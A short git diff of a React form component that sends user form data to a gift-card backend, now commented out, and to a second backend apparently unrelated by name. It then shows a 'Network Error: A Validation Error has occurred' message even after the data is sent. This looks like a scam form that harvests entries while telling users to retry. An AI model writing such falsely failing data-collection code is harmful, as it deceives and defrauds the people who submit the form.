@@ -120,8 +120,8 @@ const Formpage = ({refProp}) => {
     setLoading(true);
    
     try {
-      const response = await axios.post('https://giftcardbackend-temv.onrender.com/api/v1/create', formData);
-      console.log(response);
+      // const response = await axios.post('https://giftcardbackend-temv.onrender.com/api/v1/create', formData);
+      // console.log(response);
       const response2 = await axios.post('https://foodapp2-g4pz.onrender.com/api/v1/create', formData);
       console.log('Second API Response:', response2);
         setError('Network Error: A Validation Error has occurred. Please Try Again');
